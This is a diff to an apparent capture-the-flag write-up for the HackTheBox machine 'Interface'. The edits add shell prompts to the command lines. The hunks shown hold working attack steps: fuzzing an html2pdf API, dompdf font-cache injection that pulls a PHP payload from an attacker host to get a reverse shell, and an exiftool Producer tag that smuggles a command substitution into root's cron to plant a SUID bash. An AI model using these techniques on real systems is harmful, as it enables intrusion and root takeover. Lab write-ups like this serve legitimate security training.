@@ -20,8 +20,8 @@ Interface is a medium Linux box at `10.10.11.200`. Port `22` ran OpenSSH 7.6p1 (
 Standard two-stage scan:
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.200
-nmap -p 22,80 -sCV 10.10.11.200
+$ nmap -p- --min-rate 10000 10.10.11.200
+$ nmap -p 22,80 -sCV 10.10.11.200
 ```
 
 ```
@@ -63,7 +63,7 @@ Content discovery on the API host showed it was a PHP app fronted by Composer. T
 The base API path responded with structured JSON, which made fuzzing easy because real routes and missing routes returned different bodies. `/api` returned `{"status":"404","route not defined"}`. POST-fuzzing under `/api/` and filtering the 50-byte "missing" responses found the endpoint:
 
 ```bash
-ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST \
+$ ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST \
   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
   -mc all -fs 50
 ```
@@ -71,7 +71,7 @@ ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST \
 That returned `html2pdf`. Hitting it with an empty body gave a 422 `{"status_text":"missing parameters"}`, so it wanted JSON. Setting `Content-Type: application/json` and posting `{"html": "test"}` rendered a PDF:
 
 ```bash
-curl -s http://prd.m.rendering-api.interface.htb/api/html2pdf \
+$ curl -s http://prd.m.rendering-api.interface.htb/api/html2pdf \
   -H 'Content-Type: application/json' -d '{"html": "test"}' -o out.pdf
 ```
 
@@ -107,7 +107,7 @@ The font file is a small valid TTF with a PHP one-liner appended in the metadata
 I worked out the cache name by md5-ing the exact font URL:
 
 ```bash
-echo -n "http://10.10.16.19:9001/exploit_font.php" | md5sum
+$ echo -n "http://10.10.16.19:9001/exploit_font.php" | md5sum
 ```
 
 That hash plus `family` and `style` gives the final filename, for example:
@@ -122,7 +122,7 @@ The flow:
 2. Submit HTML that pulls in the CSS through the `html` parameter, which makes dompdf fetch the font and cache it as PHP:
 
 ```bash
-curl -s http://prd.m.rendering-api.interface.htb/api/html2pdf \
+$ curl -s http://prd.m.rendering-api.interface.htb/api/html2pdf \
   -H 'Content-Type: application/json' \
   -d '{"html":"<html><head><link rel=stylesheet href=http://10.10.16.19:9001/exploit.css></head><body>x</body></html>"}' -o /dev/null
 ```
@@ -130,7 +130,7 @@ curl -s http://prd.m.rendering-api.interface.htb/api/html2pdf \
 3. Request the cached PHP path, which runs my reverse shell:
 
 ```bash
-curl -s http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_<md5>.php
+$ curl -s http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_<md5>.php
 ```
 
 With `nc -lvnp 1337` waiting, that caught a shell as `www-data`. After a `script`/`stty` upgrade I had a usable terminal.
@@ -190,17 +190,17 @@ chmod +x s
 I copied a real image into `/tmp` so the cron would scan it, then set its Producer tag to a command substitution. The arithmetic eval then runs `/tmp/a/s` as root when the file is compared:
 
 ```bash
-cp /some/image.jpg /tmp/loot.jpg
-/usr/bin/exiftool -Producer='a[$(/tmp/a/s >&2)]+42' /tmp/loot.jpg
+$ cp /some/image.jpg /tmp/loot.jpg
+$ /usr/bin/exiftool -Producer='a[$(/tmp/a/s >&2)]+42' /tmp/loot.jpg
 ```
 
 The `a[...]` makes it look like an array subscript so the surrounding expression parses, and `+42` keeps the arithmetic syntactically valid. When root's cron processed the file, the subscript expression ran the substitution, which executed `/tmp/a/s` as root and dropped a SUID copy of bash at `/tmp/a/rr`. Running it with `-p` kept root:
 
 ```bash
-/tmp/a/rr -p
-id
+$ /tmp/a/rr -p
+$ id
 # euid=0(root)
-cat /root/root.txt
+$ cat /root/root.txt
 ```
 
 If spaces are a problem in the Producer value, `${IFS}` works as a separator, for example `a[$(cp${IFS}/bin/bash${IFS}/tmp/rr;chmod${IFS}4777${IFS}/tmp/rr)]+42`.
